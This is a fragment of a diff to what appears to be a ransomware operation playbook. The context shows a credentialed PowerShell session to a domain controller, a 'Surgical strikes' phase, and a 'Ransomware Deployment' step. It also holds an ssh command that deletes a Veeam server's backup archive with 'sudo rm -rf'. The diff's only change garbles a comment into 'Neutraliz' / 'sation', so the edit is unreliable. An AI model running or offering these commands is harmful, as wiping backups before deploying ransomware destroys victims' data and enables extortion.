@@ -96,7 +96,8 @@ Enter-PSSession -ComputerName DC01 -Credential $creds -Authentication Negotiate
 **Phase 3: Surgical strikes**
 
 ```bash
-# Backup Neutralization
+# Backup Neutraliz
+sation
 ssh backupadmin@veeam01 "sudo rm -rf /backups/archive/* --no-preserve-root"
 
 # Ransomware Deployment
